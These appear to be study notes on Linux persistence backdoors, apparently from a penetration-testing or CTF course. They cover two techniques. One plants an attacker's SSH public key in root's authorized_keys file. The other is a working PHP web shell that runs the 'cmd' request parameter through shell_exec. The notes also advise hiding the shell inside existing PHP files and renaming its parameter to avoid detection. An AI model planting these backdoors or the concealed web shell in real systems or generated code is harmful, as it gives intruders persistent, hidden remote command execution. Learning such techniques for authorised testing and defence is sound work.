# Linux Backdoors


## Introduction
- Backdoor - used to ensure consistent access to the target machine
    - Access whether it's rebooted, shutdown, etc.

## SSH Backdoors
- Consists of leaving our ssh keys in some user's home directory (preferrably the root user's home directory)
- Generate a set of ssh keys with ssh-keygen `ssh-keygen`
    - This creates one private key and one public key
- Now rename the public key to `authorized_keys`, change it's permissions with `chmod 600 id_rsa`, and go to `/root/.ssh` and leave the public key we generated there
    - If `.ssh` directory doesn't exist, create it with `mkdir .ssh`
- Login to the machine with `ssh -i id_rsa root@ip`
- Note: this backdoor isn't hidden at all, and anyone with the right permissions will be able to remove the public key

## PHP Backdoors
- Web root is usually located at `/var/www/html`
    - Whatever you leave here will be available for everyone to use in their browser
- You can leave a PHP backdoor in this directory
```
<?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
?>
```
- This code uses `$_REQUEST`, so you can pass the cmd parameter through either GET or POST requests
- If you left the file in /var/www/html/shell.php | You should be able to access it directly using : http://ip/shell.php
- If you left the shell somewhere else, look in what directory it is and then try accessing it by doing something like that : http://ip/somedirectory/shell.php
- Make backdoor more hidden
    1. Try to add this piece of code in already existing php files in /var/www/html. Adding it more towards the middle of files will definitely make our malicious actions a little more secret.
    2. Change the "cmd" parameter to something else... anything actually... just change it to something that isn't that common. "Cmd" is really common and is already really well known in the hacking community.
